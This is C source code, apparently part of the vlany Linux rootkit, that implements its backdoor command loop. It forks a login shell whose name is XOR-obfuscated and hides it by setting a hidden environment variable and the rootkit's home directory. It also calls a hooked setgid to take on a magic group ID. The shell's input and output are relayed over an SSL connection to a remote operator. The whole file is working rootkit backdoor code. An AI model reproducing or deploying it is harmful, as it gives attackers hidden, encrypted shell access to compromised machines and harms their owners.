int write_loop(int fd, char *buf, size_t size);
void cmd_loop(int sock);

void cmd_loop(int sock)
{
    #ifdef DEBUG
        printf("[vlany] cmd_loop() called\n");
    #endif

    int child_stdin[2], child_stdout[2], pid, maxfd;
    char buf[DEFAULT_TCP_BUF_LEN], _env_var[512], home_dir[512];

    if(pipe(child_stdin) == -1 || pipe(child_stdout) == -1) exit(1);

    pid = fork();
    if(pid == -1) exit(1);

    if(pid == 0)
    {
        close(child_stdin[1]);
        close(child_stdout[0]);

        dup2(child_stdin[0], STDIN_FILENO);
        dup2(child_stdout[1], STDOUT_FILENO);
        dup2(child_stdout[1], STDERR_FILENO);

        char *env_var = strdup(ENV_VAR); xor(env_var);
        char *install_dir = strdup(INSTALL_DIR); xor(install_dir);

        snprintf(_env_var, sizeof(_env_var), "%s=1", env_var);
        putenv(_env_var);

        snprintf(home_dir, sizeof(home_dir), "HOME=%s", install_dir);
        putenv(home_dir);

        CLEAN(env_var);
        CLEAN(install_dir);

        char *shell_name = strdup(SHELL_NAME); xor(shell_name);
        char *shell_type = strdup(SHELL_TYPE); xor(shell_type);

        HOOK(old_setgid, CSETGID);
        old_setgid(MAGIC_GID);
        execl(shell_type, shell_name, "-l", (char *) 0);
        CLEAN(shell_name);
        CLEAN(shell_type);
        exit(1);
    }

    close(child_stdin[0]);
    close(child_stdout[1]);

    maxfd = child_stdout[0];

    if(sock > maxfd) maxfd = sock;

    for(;;)
    {
        fd_set fds;
        int r, n_r;

        FD_ZERO(&fds);
        FD_SET(sock, &fds);
        FD_SET(child_stdout[0], &fds);

        if((r = select(maxfd+1, &fds, NULL, NULL, NULL)) == -1)
        {
            if(errno == EINTR) continue;
            else break;
        }

        if(FD_ISSET(sock, &fds))
        {
            do {
                memset(&buf, '\0', sizeof(buf));
                n_r = SSL_read(ssl, buf, sizeof(buf) - 1);

                switch(SSL_get_error(ssl, n_r))
                {
                    case SSL_ERROR_NONE:
                        break;
                    case SSL_ERROR_ZERO_RETURN:
                        goto end;
                        break;
                    case SSL_ERROR_WANT_READ:
                        break;
                    case SSL_ERROR_WANT_WRITE:
                        break;
                    default:
                        exit(1);
                }

                write_loop(child_stdin[1], buf, strlen(buf));
            } while(SSL_pending(ssl));
        }

        if(FD_ISSET(child_stdout[0], &fds))
        {
            memset(&buf, '\0', DEFAULT_TCP_BUF_LEN);
            n_r = read(child_stdout[0], buf, sizeof(buf));

            if(n_r <= 0) break;

            if(n_r <= 512) SSL_write(ssl, buf, strlen(buf));
            else{
                char temp[512], *tmp_str;
                int cnt = 0;

                while(n_r > 512)
                {
                    ++cnt;
                    bcopy(buf, &temp, 511);
                    SSL_write(ssl, temp, strlen(temp));
                    n_r -= 512;
                    tmp_str = &buf[512];
                    bcopy(tmp_str, &buf, strlen(buf));
                }
                SSL_write(ssl, buf, strlen(buf));
            }
        }
    }

end:
    if(ssl != NULL) { SSL_shutdown(ssl); SSL_free(ssl); }

    close(sock);
    exit(0);
}

int write_loop(int fd, char *buf, size_t size)
{
    #ifdef VERBOSE_DEBUG
        printf("[vlany] write_loop() called\n");
    #endif

    char *p;
    int n;
    p = buf;

    while(p - buf < size)
    {
        n = write(fd, p, size - (p - buf));
        if(n == -1)
        {
            if(errno == EINTR) continue;
            else break;
        }
        p += n;
    }
    return p - buf;
}
